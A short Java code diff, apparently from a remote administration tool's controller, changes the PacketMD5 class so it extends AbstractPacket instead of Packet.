@@ -6,7 +6,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteFiles;
 
 
-public class PacketMD5 extends Packet {
+public class PacketMD5 extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
